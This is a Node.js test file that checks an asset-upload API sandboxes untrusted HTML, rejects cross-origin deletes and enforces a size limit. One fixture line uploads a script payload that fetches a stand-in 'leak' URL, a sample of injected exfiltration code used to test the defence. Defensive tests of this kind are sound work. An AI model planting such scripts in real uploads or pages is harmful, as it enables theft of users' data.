import assert from 'node:assert/strict';
import { test } from 'node:test';
import { startApp } from './helpers.mjs';

test('active uploaded content is sandboxed, mutations reject foreign origins, and body limits hold', async t => {
  const app = await startApp(t);
  const form = new FormData(); form.set('title', 'Untrusted HTML');
  form.set('file', new Blob(['<script>fetch("https://example.invalid/leak")</script>'], { type: 'text/html' }), 'untrusted.html');
  const response = await app.request('/api/assets', { method: 'POST', body: form });
  assert.equal(response.status, 201);
  const { asset } = await response.json();
  const file = await app.request(asset.fileUrl);
  assert.match(file.headers.get('content-security-policy'), /^sandbox; default-src 'none'/);
  assert.equal(file.headers.get('x-content-type-options'), 'nosniff');
  assert.equal((await app.request(`/api/assets/${asset.id}`, { method: 'DELETE', headers: { Origin: 'https://example.invalid' } })).status, 403);
  assert.equal((await (await app.request('/api/assets')).json()).assets.length, 1);
  const large = new FormData(); large.set('title', 'Too large'); large.set('file', new Blob([new Uint8Array(2 * 1024 * 1024)]), 'large.bin');
  const rejected = await app.request('/api/assets', { method: 'POST', body: large });
  assert.equal(rejected.status, 413);
  assert.equal((await (await app.request('/api/assets')).json()).assets.length, 1);
});
